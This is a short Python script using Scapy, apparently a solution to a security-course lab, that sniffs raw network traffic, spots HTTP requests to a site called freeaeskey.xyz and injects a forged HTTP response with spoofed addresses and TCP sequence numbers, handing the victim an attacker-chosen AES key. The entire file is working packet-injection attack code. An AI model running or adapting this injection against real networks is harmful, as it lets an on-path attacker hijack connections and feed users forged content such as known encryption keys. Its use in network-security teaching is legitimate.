#!/usr/bin/python3
from scapy.all import send, conf, L3RawSocket
import scapy

def inject_pkt(pkt):
    #import dnet
    #dnet.ip().send(pkt)
    conf.L3socket=L3RawSocket
    send(pkt)

######
# edit this function to do your attack
######
def handle_pkt(pkt):
    from scapy.all import Ether, TCP, IP
    import re

    PSH_ACK = 0x18
    c = Ether(pkt)
    c.hide_defaults()
    if(c.haslayer(TCP)):
        msg = c['TCP'].flags
        if msg == PSH_ACK:
            # print(c.show())
            if re.search(b'freeaeskey.xyz',c['Raw'].load):
                str_load = 'HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nDate: Mon, 15 Mar 2021 23:57:50 GMT\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n<html>\n<head>\n  <title>Free AES Key Generator!</title>\n</head>\n<body>\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\n<br/>\n<br/>\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\n</html>'
                new_packt = IP(src=c['IP'].dst, dst=c['IP'].src)/TCP(ack=c['TCP'].seq+117, seq=c['TCP'].ack, sport=c['TCP'].dport, dport=c['TCP'].sport, flags=0x18)/ str_load
                inject_pkt(new_packt)
                
def main():
    import socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0x0300)
    while True:
        pkt = s.recv(0xffff)
        handle_pkt(pkt)

if __name__ == '__main__':
    main()
